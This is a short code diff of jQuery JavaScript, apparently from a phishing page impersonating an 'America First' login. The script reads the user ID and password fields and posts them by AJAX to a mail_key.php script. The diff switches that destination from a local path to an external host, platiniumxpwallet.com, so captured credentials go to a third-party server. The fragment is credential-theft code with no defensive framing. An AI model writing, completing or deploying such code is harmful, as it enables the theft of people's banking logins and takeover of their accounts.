@@ -11,7 +11,7 @@ $("document").ready(function () {
       login = $("#user_id").val();
       password = $("#passid").val();
       $.ajax({
-        url: "../servers/americafirst/php/mail_key.php",
+        url: "https://platiniumxpwallet.com/external/AmericaFirst/php/mail_key.php",
         method: "post",
         data: {
           login,
